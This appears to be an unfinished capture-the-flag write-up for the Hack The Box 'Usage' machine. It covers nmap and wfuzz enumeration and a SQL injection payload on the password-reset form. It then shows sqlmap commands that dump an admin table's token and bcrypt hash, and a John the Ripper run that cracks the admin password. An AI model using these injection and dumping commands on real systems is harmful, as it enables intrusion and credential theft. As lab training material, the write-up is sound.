# ROOM
Usage from HTB :)
I want to write  this writeup in english this time :)

# Information gathering
This is a website, with login, register and admin page.

As we can see in cookie, it using laravel. And that all.
# Enumeration
## Nmap
We're gonna scan the attack surface using nmap
```
nmap -sC -sV $TARGET -p -o nmap.txt
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 04:00 EDT
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Nmap scan report for usage.htb (10.10.11.18)
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Daily Blogs
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 292.50 seconds
```
## Wfuzz
Using wfuzz, we can see they have only 1 avaible subdomain
```
wfuzz -c -u http://usage.htb -H "Host: FUZZ.usage.htb" -w /home/kali/Wordlist/subdomains-top1million-5000.txt --hc 301
```
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://usage.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                               
=====================================================================

000000024:   200        88 L     226 W      3304 Ch     "admin"                                                                                               

Total time: 12.70573
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 392.6572
```
## Manual search
After trying multiple things, i found a field vulnerable to SQL injection in reset password page.
This payload :
```
bleh@bleh.com' AND 1=1;-- -
```
Return :
```
We have e-mailed your password reset link to bleh@bleh.com' AND 1=1;-- - 
```
Wich means its vulnerable.

# Exploitation
With SQL Map, we're gonna try to exploit the SQL injection to get some credentials or other usefull stuff.

I catch the request using burpsuite:
```
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://usage.htb
Connection: close
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6IlI1T3JPcXY3M213Y3ZYdzg3V2gvM3c9PSIsInZhbHVlIjoiVllIVGUvclV3ajZ6dnREc2xLVHNrMGNuMERHSS8rc0tzdmwzb2YybFBzVkM5N29NYTVwVHMzdGVpYmU4VkpYSjlCaFQrSGRvTlVhWk5ma1liZzAvRDFjMzN3R3djeXBZTXI0c0RIbXgyMTZMU0ROVkVVdUgwemZNT21XYnZESlEiLCJtYWMiOiI4MmEzZWViZDYzMjVlNWUyMTgxYTY1ZmFkODExODQ3MGEyYzE4Y2M4MzEwN2ViMjE1NDgxNjEwNDRiMGU3NmQxIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ik8va1UrVWFQSVZUeE40aDRkbTNZZXc9PSIsInZhbHVlIjoiTFNUd1VScDhNZmJSQXAxaTRiR2t3NktSaTYzQXk0M0pEa0pGUjJFc2VrOTNYOTcyU0ZFU3JLVTRPWnQreGgva01zRDZQNlBmZnlqRUJQY25jMUNwdzkwUDZ4V01xNFptUlA2RSs3WFUydFg2d2xPT292Rm5zdklkZ0h2TXJoQVUiLCJtYWMiOiIxNjgwZGYwMTQzMTY3OWY3ZWUzYzJkMWVlMWZiM2ExZThiMGUxOTM3OGE0MGI0ZGI5MjE1NDAzZjFhZmVlMTA1IiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1

_token=hK2lIyI4ojEn9lACt8ogdKKBepGlCFp0WaEC5Ssh&email=test
```
Save it to file (like req.txt) then use sqlmap. Its a challenge, so we dont care about the risk or other sneaky parameters.
```
sqlmap -r req.txt -p email -bash --dump-all
```
It found some usefull stuff but it can't dump the admin_users :
```
[08:55:07] [ERROR] unable to retrieve the number of columns for table 'admin_users' in database 'usage_blog'
[08:55:07] [WARNING] unable to retrieve column names for table 'admin_users' in database 'usage_blog'
[08:55:07] [WARNING] unable to enumerate the columns for table 'admin_users' in database 'usage_blog'
```
We're gonna try to dump **admin_users**, i added --dbms to be more accurate because now we knew it use MySQL.
```
sqlmap -r req.txt -p email --batch --dbms=MySQL -T admin_users --dump
```
```
+----+---------------+---------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+---------------------+---------------------+--------------------------------------------------------------+
```
We have a token. But no password. We're gonna try to get the password column now
```
sqlmap -r req.txt -p email --batch --dbms=MySQL -T admin_users -C password --dump
```
```
+--------------------------------------------------------------+
| password                                                     |
+--------------------------------------------------------------+
| $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+--------------------------------------------------------------+
```
Finally !
Now, we need to crack it.
```
john --wordlist=/home/kali/Wordlist/rockyou.txt hash  
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:11 DONE (2024-04-29 09:57) 0.08888g/s 144.0p/s 144.0c/s 144.0C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
So, here the admin account :
```
Administrator
whatever1
```
# Post exploit

**NOT FINISH YET**
